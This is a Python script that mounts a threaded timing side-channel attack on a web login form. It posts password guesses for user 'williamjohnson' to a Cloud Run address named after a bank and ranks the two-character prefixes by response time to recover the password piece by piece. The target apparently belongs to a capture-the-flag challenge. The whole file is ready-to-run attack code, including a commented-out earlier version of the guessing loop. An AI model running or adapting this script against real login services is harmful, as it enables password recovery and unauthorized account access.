import requests
from string import printable
from itertools import product
import threading 
from queue import Queue
import time

final = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()_{}?"	

flagger = True
cnt = 1

print_lock = threading.Lock()

dt = {}

def exampleJob(worker):
	global cnt
	website = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/"
	payload = {'username':'williamjohnson', 'Password':f'{worker + "d"*5}'}
	response = requests.post(website,params = payload)
	dt[worker] = response.elapsed.total_seconds()
	# with print_lock:
	# 	print(worker , response.elapsed.total_seconds())


def threader():
	while flagger:
		worker = q.get()
		exampleJob(worker)
		q.task_done()

q = Queue()

for x in range(150):
	t = threading.Thread(target = threader)

	t.daemon = True
	#it will die when the main thread dies
	t.start()

start = time.time()

for i,j in product(final,repeat = 2):
	q.put(i+j)

q.join()

print('Entire job took :',time.time()-start)



sorted_dt = {key: value for key, value in sorted(dt.items(), key=lambda item: item[1],reverse = True)}

count = 0

for i,j in sorted_dt.items():
	if count > 10:
		break
	print(i,j)
	count += 1


# for i,j in product(printable,repeat = 2):
#     website = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/"
#     payload = {'username':'williamjohnson', 'Password':f'{i+j + "d"*10}'}
#     response = requests.post(website,params = payload)
#     # print(response.text)
#     # if response.elapsed.total_seconds()>0.30 or response.elapsed.total_seconds()< 0.20:
#     print(i + j , response.elapsed.total_seconds())



